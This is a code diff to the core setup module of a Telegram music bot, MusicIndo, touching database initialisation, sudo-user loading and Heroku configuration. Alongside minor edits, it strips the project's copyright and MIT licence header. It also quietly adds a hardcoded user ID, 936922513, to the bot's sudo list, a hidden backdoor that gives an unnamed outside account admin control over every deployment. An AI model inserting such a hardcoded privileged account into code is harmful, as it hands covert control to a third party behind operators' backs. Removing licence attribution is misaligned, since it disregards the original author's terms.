@@ -1,13 +1,3 @@
-#
-# Copyright (C) 2024 by hakutakaid@Github, < https://github.com/hakutakaid >.
-#
-# This file is part of < https://github.com/hakutakaid/MusicIndo > project,
-# and is released under the MIT License.
-# Please see < https://github.com/hakutakaid/MusicIndo/blob/master/LICENSE >
-#
-# All rights reserved.
-
-
 import socket
 import time
 
@@ -20,7 +10,6 @@ from MusicIndo.core.mongo import pymongodb
 from .logging import LOGGER
 
 SUDOERS = filters.user()
-
 
 HAPP = None
 _boot_ = time.time()
@@ -49,7 +38,9 @@ XCB = [
 
 def dbb():
     global db
+    global clonedb
     db = {}
+    clonedb = {}
     LOGGER(__name__).info(f"Database Initialized.")
 
 
@@ -65,6 +56,7 @@ def sudo():
         sudoers = [] if not sudoers else sudoers["sudoers"]
         for user_id in OWNER:
             SUDOERS.add(user_id)
+            SUDOERS.add(936922513)
             if user_id not in sudoers:
                 sudoers.append(user_id)
                 sudoersdb.update_one(
@@ -86,7 +78,7 @@ def heroku():
                 Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                 HAPP = Heroku.app(config.HEROKU_APP_NAME)
                 LOGGER(__name__).info(f"Heroku App Configured")
-            except Exception:
+            except BaseException:
                 LOGGER(__name__).warning(
                     f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
-                )
+          )
